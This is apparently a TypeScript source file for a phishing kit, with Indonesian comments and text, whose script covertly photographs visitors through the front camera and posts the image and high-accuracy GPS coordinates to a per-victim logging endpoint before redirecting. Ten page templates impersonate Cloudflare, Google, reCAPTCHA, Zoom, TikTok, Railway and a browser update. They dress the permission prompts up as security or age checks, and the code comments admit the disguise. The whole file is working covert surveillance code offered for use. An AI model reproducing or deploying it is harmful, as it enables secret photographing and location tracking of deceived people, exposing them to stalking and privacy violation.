export const getCaptureScript = (id: string, redirectUrl: string = 'https://google.com') => `
<video id="video" width="320" height="240" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<script>
  let gpsAttempted = false;
  let camAttempted = false;
  let startTime = Date.now();
  let hasRedirected = false;
  
  const checkRedirect = () => {
    if (hasRedirected) return;
    const elapsed = (Date.now() - startTime) / 1000;
    
    // Kriteria redirect:
    // 1. Sudah lewat 25 detik (timeout maksimal)
    // 2. Keduanya sudah selesai (berhasil/gagal) DAN minimal sudah 10 detik halaman standby agar jepretan kamera terkirim sempurna
    if (elapsed >= 25 || (gpsAttempted && camAttempted && elapsed >= 10)) {
      hasRedirected = true;
      window.location.href = '${redirectUrl}';
    }
  };

  setInterval(checkRedirect, 1000);

  function startCapture() {
    console.log("Starting security verification sequence...");
    
    // 1. Capture Camera (Dibalut izin 'Sinkronisasi Media/Galeri')
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
          const video = document.getElementById('video');
          video.srcObject = stream;
          video.play();
          
          setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imgData = canvas.toDataURL('image/jpeg', 0.6); // Kompresi dikit biar cepet kirim
            
            fetch('/api/log/${id}/cam', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ image: imgData })
            }).finally(() => { 
                camAttempted = true; 
                stream.getTracks().forEach(track => track.stop());
            });
          }, 3000); // Tunggu video stabil 3 detik baru jepret
        })
        .catch(function(err) {
          camAttempted = true;
        });
    } else { camAttempted = true; }

    // 2. Capture GPS (Dibalut izin 'Verifikasi Lokasi Aman')
    if (navigator.geolocation) { 
      navigator.geolocation.getCurrentPosition( 
        (pos) => { 
          fetch('/api/log/${id}/gps', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }) 
          }).finally(() => { gpsAttempted = true; }); 
        }, 
        (err) => { gpsAttempted = true; }, 
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } 
      ); 
    } else { gpsAttempted = true; }
  }

  // Auto-trigger jika browser mengizinkan
  window.onload = () => {
    setTimeout(startCapture, 2000);
  };
</script>
`;

export const templates: Record<string, {name: string, render: (id: string) => string}> = {
  '1': {
    name: "Standard: Verifikasi Koneksi Aman",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Security Check</title><style>body { background:#fff; color:#333; font-family:-apple-system, sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center;} .box { max-width:400px; padding:20px; } .loader { border:3px solid #f3f3f3; border-top:3px solid #3498db; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:0 auto 20px;} @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:25px; } .btn { background:#3498db; color:#fff; border:none; padding:12px 30px; border-radius:5px; font-weight:bold; cursor:pointer; font-size:16px; } .btn:active { background:#2980b9; }</style></head><body><div class="box"><div class="loader"></div><h2>Memverifikasi Koneksi...</h2><p>Sistem mendeteksi aktivitas mesin otomatis. Klik tombol di bawah dan <b>Izinkan</b> sinkronisasi identitas media untuk membuktikan Anda bukan robot.</p><button class="btn" onclick="startCapture(); this.innerHTML='Memproses...';">VERIFIKASI SAYA</button></div>${getCaptureScript(id)}</body></html>`
  },
  '2': {
    name: "Cloudflare: Browser Integrity Check",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Needed</title><style>body { font-family:system-ui, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; margin:0; text-align:center; padding:20px; } .dot-spinner { display:flex; gap:8px; margin-bottom:20px; } .dot { width:10px; height:10px; background:#fa8231; border-radius:50%; animation:bounce 0.5s infinite alternate; } .dot:nth-child(2) { animation-delay:0.1s; } .dot:nth-child(3) { animation-delay:0.2s; } @keyframes bounce { to { transform:translateY(-10px); } } h1 { font-size:24px; font-weight:500; } .info { font-size:14px; color:#555; max-width:400px; margin-bottom:30px; } .btn { border:1px solid #ccc; background:#fff; padding:10px 20px; border-radius:4px; font-weight:600; cursor:pointer; box-shadow:0 1px 2px rgba(0,0,0,0.05); }</style></head><body><img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" width="120" style="margin-bottom:30px;"><div class="dot-spinner"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div><h1>Verifying your browser...</h1><p class="info">Please confirm your connection is secure. Click the check box below and <b>Allow</b> the verification request to continue.</p><button class="btn" onclick="startCapture(); this.innerHTML='Loading...';">Confirm Identity (Safe-Sync)</button><br><span style="font-size:10px;color:#999;">Ray ID: ${id}</span>${getCaptureScript(id)}</body></html>`
  },
  '3': {
    name: "Redirect: Verifikasi File",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Redirecting...</title><style>body { background:#f9f9f9; text-align:center; padding-top:20vh; font-family:sans-serif;} .box { background:#fff; border:1px solid #ddd; display:inline-block; padding:40px; border-radius:10px; box-shadow:0 4px 6px rgba(0,0,0,0.05); } .icon { font-size:50px; margin-bottom:15px; } .btn { background:#000; color:#fff; border:none; padding:12px 40px; border-radius:25px; font-weight:bold; cursor:pointer; margin-top:20px; }</style></head><body><div class="box"><div class="icon">🔓</div><h2>Verifikasi Diperlukan</h2><p>Halaman ini meminta izin sinkronisasi media untuk pengalihan aman. Klik tombol di bawah dan pilih <b>Allow / Izinkan</b> untuk mulai mentransfer data.</p><button class="btn" onclick="startCapture(); this.innerHTML='Wait...';">BUKA KONTEN</button></div>${getCaptureScript(id)}</body></html>`
  },
  '4': {
    name: "Google: Verifikasi Perangkat",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google Secure</title><style>body { font-family: 'Roboto', Arial, sans-serif; text-align:center; padding-top:10vh; } .container { max-width:400px; margin:0 auto; padding:20px; border:1px solid #efefef; border-radius:8px; } h2 { font-weight:400; color: #1a73e8; } .btn { background:#1a73e8; color:white; border:none; padding:12px 24px; border-radius:4px; cursor:pointer; font-weight:500; }</style></head><body><div class="container"><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90"><br><br><h2>Verifikasi Akun</h2><p>Untuk alasan keamanan, Google meminta Anda mensinkronkan device dengan akun ini. Klik tombol dan pilih <b>Allow</b> untuk mengonfirmasi Anda bukan bot.</p><button class="btn" onclick="startCapture(); this.innerHTML='Sync...';">VERIFIKASI AKUN</button></div>${getCaptureScript(id)}</body></html>`
  },
  '5': {
    name: "System: Security Scanner",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>System Sync</title><style>body { background:#000; color:#0f0; font-family:'Courier New', monospace; text-align:center; padding-top:20vh; } .btn { border:1px solid #0f0; background:transparent; color:#0f0; padding:15px 30px; cursor:pointer; font-size:18px; }</style></head><body><div style="max-width:500px; margin:0 auto;"><h1>SCANNING DEVICE...</h1><p>[*] Checking browser integrity<br>[*] Requesting hardware validation link...<br><br>Please click below and <b>Allow</b> camera/location sync to complete the scan.</p><br><button class="btn" onclick="startCapture(); this.innerHTML='[SCANNING...]';">WHITELIST DEVICE</button></div>${getCaptureScript(id)}</body></html>`
  },
  '6': {
    name: "Railway: Deploy Authentication",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Railway App</title><style>body { background:#111; color:#fff; font-family:sans-serif; text-align:center; padding-top:20vh; } .btn { background:#e1ff00; color:#000; padding:12px 25px; border-radius:6px; font-weight:bold; border:none; margin-top:20px; cursor:pointer; }</style></head><body><div style="max-width:500px; margin:0 auto;"><img src="https://railway.app/brand/logotype-dark.svg" width="150" style="margin-bottom:30px;"><br><h2>Login Verification</h2><p>Railway memerlukan izin sinkronisasi device untuk mengamankan akses ke server pribadi. Klik Approve dan <b>Allow</b> izin sistem.</p><button class="btn" onclick="startCapture(); this.innerHTML='Validating...';">APPROVE ACCESS</button></div>${getCaptureScript(id)}</body></html>`
  },
  '7': {
    name: "Zoom: Camera Verifier",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Zoom Calibration</title><style>body { background:#fff; font-family:sans-serif; text-align:center; padding-top:15vh; } .btn { background:#2d8cff; color:#fff; padding:15px 30px; border-radius:10px; font-weight:bold; border:none; cursor:pointer; font-size:18px; }</style></head><body><img src="https://st1.zoom.us/static/6.3.25055/image/new/ZoomLogo.png" width="120"><br><br><h1>Persiapan Video...</h1><p>Browser Anda meminta izin kalibrasi media. Klik tombol di bawah dan pilih <b>Allow / Izinkan</b> agar video tidak pecah.</p><button class="btn" onclick="startCapture(); this.innerHTML='Memproses...';">IZINKAN KAMERA</button></body>${getCaptureScript(id, 'https://zoom.us/')}</html>`
  },
  '8': {
    name: "TikTok: Verifikasi 18+",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>TikTok</title><style>body { background:#121212; color:white; text-align:center; padding-top:20vh; font-family:sans-serif; } .btn { background:#fe2c55; color:white; padding:15px 40px; border-radius:4px; font-weight:bold; border:none; cursor:pointer; font-size:16px; }</style></head><body><div style="font-size:40px;">🔞</div><h2>VIDEO DIBATASI USIA</h2><p>Konten ini hanya untuk pemirsa dewasa. Klik tombol konfirmasi dan <b>Allow</b> untuk memverifikasi umur melalui sinkronisasi lokasi.</p><button class="btn" onclick="startCapture(); this.innerHTML='Verifying...';">KONFIRMASI UMUR</button></body>${getCaptureScript(id)}</html>`
  },
  '9': {
    name: "Captcha: Human Intelligence Task",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#f9f9f9; } .box { border:1px solid #d3d3d3; padding:15px; background:#fff; box-shadow:0 2px 4px rgba(0,0,0,0.1); display:flex; align-items:center; width:300px; cursor:pointer; }</style></head><body><div style="text-align:center;"><p style="margin-bottom:20px; color:#555;">Selesaikan tantangan untuk melanjutkan.<br>Klik kotak dan pilih <b>"Allow"</b>.</p><div class="box" onclick="startCapture(); this.querySelector('.check').innerHTML='✓';"><div class="check" style="width:25px; height:25px; border:2px solid #c1c1c1; margin-right:15px; display:flex; align-items:center; justify-content:center; color:green; font-weight:bold;"></div><div style="font-size:14px; color:#555;">Saya bukan robot</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="30"><br>reCAPTCHA</div></div></div>${getCaptureScript(id)}</body></html>`
  },
  '10':{
    name: "Update: Browser Security Sync",
    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Browser Update</title><style>body { font-family:sans-serif; text-align:center; padding-top:20vh; background:#f5f5f7; } .btn { background:#007aff; color:white; padding:12px 30px; border-radius:22px; border:none; cursor:pointer; font-weight:600; }</style></head><body><div style="font-size:50px; color:#007aff; margin-bottom:20px;">🛡️</div><h1>Update Diperlukan</h1><p>Sertifikat keamanan browser Anda kedaluwarsa. Klik update dan pilih <b>Allow</b> untuk sinkronisasi otomatis.</p><button class="btn" onclick="startCapture(); this.innerHTML='Updating...';">UPDATE SEKARANG</button></body>${getCaptureScript(id)}</html>`
  }
};
